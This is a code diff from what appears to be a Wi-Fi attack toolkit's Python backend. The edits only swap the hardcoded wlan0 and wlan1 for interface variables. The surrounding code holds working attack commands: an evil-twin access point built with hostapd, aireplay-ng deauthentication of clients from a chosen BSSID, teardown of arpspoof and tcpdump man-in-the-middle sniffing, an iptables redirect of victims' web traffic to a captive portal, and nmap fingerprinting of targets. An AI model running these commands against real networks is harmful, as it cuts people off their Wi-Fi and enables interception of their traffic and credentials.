@@ -47,9 +47,9 @@ def set_dns(cfg: str):
     sh(f"dnsmasq --conf-file={DNSCFG}")
 
 def ap_up():
-    sh(f"pkill hostapd; sleep 1; nmcli dev set wlan0 managed no 2>/dev/null; "
-       f"ip addr flush dev wlan0; ip addr add 192.168.66.1/24 dev wlan0; "
-       f"ip link set wlan0 up; hostapd -B {HOSTAPD}")
+    sh(f"pkill hostapd; sleep 1; nmcli dev set {AP_IF} managed no 2>/dev/null; "
+       f"ip addr flush dev {AP_IF}; ip addr add 192.168.66.1/24 dev {AP_IF}; "
+       f"ip link set {AP_IF} up; hostapd -B {HOSTAPD}")
 
 def ap_start():
     ap_up()
@@ -82,7 +82,7 @@ def ap_cfg():
 def set_eviltwin(ssid: str):
     # ssid already stripped and length-capped by caller
     with open(HOSTAPD, "w") as f:
-        f.write(f"interface=wlan0\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\n")
+        f.write(f"interface={AP_IF}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\n")
     ap_up()
 
 def set_normal_ap():
@@ -99,7 +99,7 @@ def clients():
             if len(p) >= 4:
                 leases[p[1].upper()] = (p[2], p[3])
     try:
-        for l in sh("iw dev wlan0 station dump").splitlines():
+        for l in sh(f"iw dev {AP_IF} station dump").splitlines():
             if l.startswith("Station"):
                 mac = l.split()[1].upper()
                 ip, name = leases.get(mac, ("", ""))
@@ -166,12 +166,12 @@ def mitm_router_stop():
        "rm -f /tmp/mitm-router.lock")
     sh("pkill -9 -x arpspoof 2>/dev/null; "
        "for p in $(pgrep -f '[m]itm-sniff'); do kill -9 $p; done 2>/dev/null; "
-       "for p in $(pgrep -f 'tcpdump -i wlan1'); do kill -9 $p; done 2>/dev/null")
+       f"for p in $(pgrep -f 'tcpdump -i {MON_IF}'); do kill -9 $p; done 2>/dev/null")
     sh("ip rule del table 100 2>/dev/null; ip route flush table 100 2>/dev/null; "
-       "echo 1 > /proc/sys/net/ipv4/conf/wlan1/send_redirects 2>/dev/null")
+       f"echo 1 > /proc/sys/net/ipv4/conf/{MON_IF}/send_redirects 2>/dev/null")
     # red de seguridad: si el KILL evitó el trap del motor, dejar wlan1 en monitor + kismet
-    sh("nmcli dev set wlan1 managed no 2>/dev/null; ip link set wlan1 down; "
-       "iw dev wlan1 set type monitor 2>/dev/null; ip link set wlan1 up; "
+    sh(f"nmcli dev set {MON_IF} managed no 2>/dev/null; ip link set {MON_IF} down; "
+       f"iw dev {MON_IF} set type monitor 2>/dev/null; ip link set {MON_IF} up; "
        "systemctl start kismet-sensor.service")
     for f in (MITMTARGET, MITMDEVICES, MITMINFO):
         try: os.remove(f)
@@ -209,9 +209,9 @@ def mitm_set_target(ip: str):
 def mitm_audit(ip: str, action: str):
     """nmap dirigido sobre el device target. ip validada (regex), action de set fijo."""
     cmds = {
-        "ports":    f"nmap -F -T4 -e wlan1 {ip}",
-        "os":       f"nmap -O --osscan-guess -T4 -e wlan1 {ip}",
-        "services": f"nmap -sV -T4 --top-ports 50 -e wlan1 {ip}",
+        "ports":    f"nmap -F -T4 -e {MON_IF} {ip}",
+        "os":       f"nmap -O --osscan-guess -T4 -e {MON_IF} {ip}",
+        "services": f"nmap -sV -T4 --top-ports 50 -e {MON_IF} {ip}",
     }
     cmd = cmds.get(action)
     if not cmd:
@@ -231,25 +231,25 @@ def portal_on_state():
 
 def portal_on():
     set_dns(DNS_PORTAL)
-    sh("iptables -t nat -C PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT "
+    sh(f"iptables -t nat -C PREROUTING -i {AP_IF} -p tcp --dport 80 -j DNAT "
        "--to-destination 192.168.66.1:80 2>/dev/null || "
-       "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT "
+       f"iptables -t nat -A PREROUTING -i {AP_IF} -p tcp --dport 80 -j DNAT "
        "--to-destination 192.168.66.1:80")
     sh(f"pkill -f {PORTAL}")
     sh(f"nohup python3 {PORTAL} >/tmp/portal.log 2>&1 &")
 
 def portal_off():
     sh(f"pkill -f {PORTAL}")
-    sh("iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT "
+    sh(f"iptables -t nat -D PREROUTING -i {AP_IF} -p tcp --dport 80 -j DNAT "
        "--to-destination 192.168.66.1:80 2>/dev/null")
     set_dns(DNS_NORMAL)
 
 def deauth(bssid: str, ch: str):
     # bssid and ch are already regex-validated by the caller
     sh("systemctl stop kismet-sensor.service")
-    sh(f"ip link set wlan1 down; iw dev wlan1 set type monitor; "
-       f"ip link set wlan1 up; iw dev wlan1 set channel {ch}")
-    sh(f"timeout 7 aireplay-ng -0 10 -a {bssid} wlan1")
+    sh(f"ip link set {MON_IF} down; iw dev {MON_IF} set type monitor; "
+       f"ip link set {MON_IF} up; iw dev {MON_IF} set channel {ch}")
+    sh(f"timeout 7 aireplay-ng -0 10 -a {bssid} {MON_IF}")
     sh("systemctl start kismet-sensor.service")
 
 def kcreds():
@@ -364,10 +364,10 @@ def parse_channel_stats():
 
 def recon_scan():
     sh("systemctl stop kismet-sensor.service; pkill -9 -f kismet_cap_linux_wifi; sleep 1")
-    sh("nmcli dev set wlan1 managed no 2>/dev/null; ip link set wlan1 down; "
-       "iw dev wlan1 set type monitor; ip link set wlan1 up 2>/dev/null")
+    sh(f"nmcli dev set {MON_IF} managed no 2>/dev/null; ip link set {MON_IF} down; "
+       f"iw dev {MON_IF} set type monitor; ip link set {MON_IF} up 2>/dev/null")
     sh("rm -f /tmp/scan-*.csv")
-    sh("nohup bash -c 'timeout 15 airodump-ng --output-format csv -w /tmp/scan wlan1 "
+    sh(f"nohup bash -c 'timeout 15 airodump-ng --output-format csv -w /tmp/scan {MON_IF} "
        ">/dev/null 2>&1; systemctl start kismet-sensor.service' &")
 
 def ble_scan_start():
